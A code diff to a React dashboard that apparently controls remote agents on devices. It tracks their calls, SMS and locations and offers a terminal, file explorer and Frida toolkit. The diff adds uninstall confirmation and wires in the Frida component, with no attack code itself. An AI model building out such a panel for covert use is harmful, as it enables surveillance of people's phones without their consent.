@@ -69,6 +69,7 @@ import { FileExplorer } from '@/components/file-explorer';
 import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
 import { Input } from '@/components/ui/input';
 import { Terminal } from '@/components/terminal';
+import { FridaToolkit } from '@/components/frida-toolkit';
 import { cn } from '@/lib/utils';
 import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from './ui/alert-dialog';
 
@@ -115,6 +116,7 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
   const [tempDeviceName, setTempDeviceName] = React.useState(selectedDevice.name);
   const [isEditDialogOpen, setIsEditDialogOpen] = React.useState(false);
   const [confirmationGuid, setConfirmationGuid] = React.useState('');
+  const [isDeleting, setIsDeleting] = React.useState(false);
   const [calls, setCalls] = React.useState<Call[]>([]);
   const [sms, setSms] = React.useState<Sms[]>([]);
   const [locations, setLocations] = React.useState<Location[]>([]);
@@ -229,27 +231,53 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
   };
 
   const handleDeleteAgent = async () => {
+    if (confirmationGuid !== selectedDevice.guid) {
+      toast({
+        variant: 'destructive',
+        title: 'Invalid GUID',
+        description: 'The entered GUID does not match the device GUID'
+      });
+      return;
+    }
+
+    setIsDeleting(true);
     try {
+      toast({
+        title: 'Deleting Agent',
+        description: 'Sending uninstall command to device...'
+      });
+
       const response = await apiClient.deleteDevice(selectedDevice.guid);
       if (response.success) {
+        // Clear confirmation GUID
+        setConfirmationGuid('');
+        
         toast({
-          title: 'Success',
-          description: 'Agent uninstalled successfully'
+          title: 'Agent Deleted Successfully',
+          description: `Agent with GUID ${selectedDevice.guid} has been uninstalled and removed from the dashboard`
         });
+        
+        // Unsubscribe from websocket events for this device
+        wsClient.unsubscribeFromDevice(selectedDevice.guid);
+        
+        // Navigate back to device selection
         onDeviceSelect(null);
       } else {
         toast({
           variant: 'destructive',
-          title: 'Error',
-          description: response.error || 'Failed to uninstall agent'
+          title: 'Deletion Failed',
+          description: response.error || 'Failed to uninstall agent from device'
         });
       }
-    } catch (error) {
+    } catch (error: any) {
+      console.error('Delete agent error:', error);
       toast({
         variant: 'destructive',
-        title: 'Error',
-        description: 'Failed to uninstall agent'
+        title: 'Connection Error',
+        description: 'Failed to communicate with server. Please check your connection and try again.'
       });
+    } finally {
+      setIsDeleting(false);
     }
   };
 
@@ -575,14 +603,7 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                     )}
 
                     {activeTab === 'frida' && (
-                        <Card>
-                        <CardHeader>
-                            <CardTitle>Frida Toolkit</CardTitle>
-                        </CardHeader>
-                        <CardContent className="text-center text-muted-foreground">
-                            <p>Frida Toolkit integration will be available here.</p>
-                        </CardContent>
-                        </Card>
+                        <FridaToolkit deviceId={selectedDevice.guid} />
                     )}
                     {activeTab === 'locations' && (
                         <LocationMap device={selectedDevice} height="600px" />
@@ -642,11 +663,11 @@ export function DashboardLayout({ selectedDevice: initialDevice, onDeviceSelect 
                                     <AlertDialogFooter>
                                         <AlertDialogCancel onClick={() => setConfirmationGuid('')}>Cancel</AlertDialogCancel>
                                         <AlertDialogAction
-                                        disabled={confirmationGuid !== selectedDevice.guid}
+                                        disabled={confirmationGuid !== selectedDevice.guid || isDeleting}
                                         className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
                                         onClick={handleDeleteAgent}
                                         >
-                                        Uninstall Agent
+                                        {isDeleting ? 'Deleting...' : 'Uninstall Agent'}
                                         </AlertDialogAction>
                                     </AlertDialogFooter>
                                     </AlertDialogContent>
